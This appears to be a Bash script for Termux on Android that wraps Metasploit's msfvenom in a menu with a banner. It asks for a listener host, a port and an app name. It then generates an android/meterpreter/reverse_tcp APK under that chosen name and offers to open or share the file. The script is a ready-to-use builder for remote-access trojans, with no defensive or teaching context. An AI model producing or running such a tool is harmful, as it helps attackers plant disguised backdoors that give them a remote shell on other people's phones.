#!/usr/bin/bash

if [ ! -d "/data/data/com.termux/files/usr/opt/metasploit-framework" ]; then
echo
echo -e '\033[1;91m[!] You have to install "Metasploit-framework" ; then you can use it."\033[0m'
echo
printf "[?] Are you want to install Metasploit-framework right Now [Y/n] ? "
read ask
if [[ $ask = "y" ]] || [[ ask = "Y" ]];then
bash install.sh
else echo "abort."
exit
fi
fi

command -v tput > /dev/null 2>&1 || { echo -ne "\e[0m[⬇] Installing Requirements... \r"; apt install ncurses-utils &> /dev/null ; connection="$(ping -c 1 -q www.google.com >&/dev/null; echo $?)"
if [[ "$connection" != 0 ]]
then clear
echo -e "\033[1;91m[\033[1;92m-\033[1;91m] No Internet\033[1;92m connection!"
   exit
fi; }

if [ -d "/data/data/com.termux/files/usr/opt/metasploit-framework" ]; then

#banner
clear
echo -e "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m
█▀▄▀█ █▀ █ █ █▀▀ █▄ █ █▀█ █▀▄▀█
█ ▀ █ ▄█ ▀▄▀ ██▄ █ ▀█ █▄█ █ ▀ █
\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
\e[0m"

echo -e '\033[1;92m[!] Choose your LHOST'
read -p 'msvenom > ' lhost
echo
echo -e '\033[1;92m[!] Choose your LPORT'
read -p 'msvenom > ' lport
echo
echo -e '\033[1;92m[!] Choose your App Name'
read -p 'msvenom > ' app
printf '\033[0m\033[1;93m'

if [ ! -d '/data/data/com.termux/files/home/storage' ];then
termux-setup-storage
sleep 5
fi

spin () {

local pid=$!
local delay=0.25
local spinner=( '' '.' '..' '...' )

while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do

for i in "${spinner[@]}"
do
	tput civis
	echo -ne "\033[1;94m\r[\e[1;92m+\e[1;94m] Creating Payload wait\033[1;92m$i\033[0m    \r";
	sleep $delay
        printf "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b";
done
done
tput cnorm
printf "\e[1m[\e[1;92m√\e[0m\e[1m]\e[92m Payload Created\e\e[0m           ";
echo "";

}
trap '' 2
echo
( msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /sdcard/$app.apk ) & spin
trap 5
echo
echo -e '\033[0m\033[1m[√] Payload Saved Dir : emulated/0/'
echo
printf '\033[1;92m[?] Are you want to Open/Send this payload ? [O/S/n] '
read ask
if [[ $ask = "o" ]] || [[ $ask = "O" ]]
        then cd /sdcard && xdg-open $app.apk
elif [[ $ask = "s" ]] || [[ $ask = "S" ]]
        then cd /sdcard && xdg-open --send $app.apk
else echo 'Abort.'
echo
exit
fi

sleep 2
echo
printf '\033[1;92m[?] Are you want to delete this payload ? [Y/n] '
read ask
if [[ $ask = "y" ]] || [[ $ask = "Y" ]]
        then cd /sdcard && rm $app.apk
echo -e '\033[1;92m[\033[0m-\033[1;92m] Deleted.'
echo
exit
else echo 'Abort.'
echo
fi
fi
